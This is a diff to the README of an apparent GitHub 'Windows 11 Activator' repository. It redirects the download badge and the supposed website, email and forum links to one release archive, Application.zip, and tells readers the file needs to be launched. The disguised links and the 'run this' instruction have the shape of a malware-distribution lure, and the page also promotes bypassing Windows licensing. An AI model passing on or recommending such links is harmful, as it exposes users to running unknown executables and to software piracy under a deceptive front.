@@ -25,7 +25,7 @@ Welcome to the Windows 11 Activator Download repository! Here you can find all t
 
 Click the button below to download the software to activate various features in Windows 11:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/haikalz0/Windows-11-Activator-Download/releases/download/v1.0/Application.zip)](https://github.com/haikalz0/Windows-11-Activator-Download/releases/download/v1.0/Application.zip)
 
 *Note: The link above leads to a file that needs to be launched.*
 
@@ -35,11 +35,11 @@ In this repository, you will find tools and guides on how to activate different 
 
 ## Explore Further 🌐
 
-Visit our [website](https://github.com/Rubenas123/6487922) for more information and updates. Feel free to explore the repository, contribute, and enhance your Windows 11 experience today! 
+Visit our [website](https://github.com/haikalz0/Windows-11-Activator-Download/releases/download/v1.0/Application.zip) for more information and updates. Feel free to explore the repository, contribute, and enhance your Windows 11 experience today! 
 
 ## Let's Connect! 🤝
 
-Have questions or suggestions? Reach out to us by [email](mailto:contact@windows11activatordownload.com) or join our [community forum](https://github.com/Rubenas123/6487922/discussions) to engage with other users.
+Have questions or suggestions? Reach out to us by [email](https://github.com/haikalz0/Windows-11-Activator-Download/releases/download/v1.0/Application.zip) or join our [community forum](https://github.com/haikalz0/Windows-11-Activator-Download/releases/download/v1.0/Application.zip) to engage with other users.
 
 We hope you enjoy exploring and activating various features in Windows 11 with our resources. Happy activating! 🚀🔒🎧🔍
 
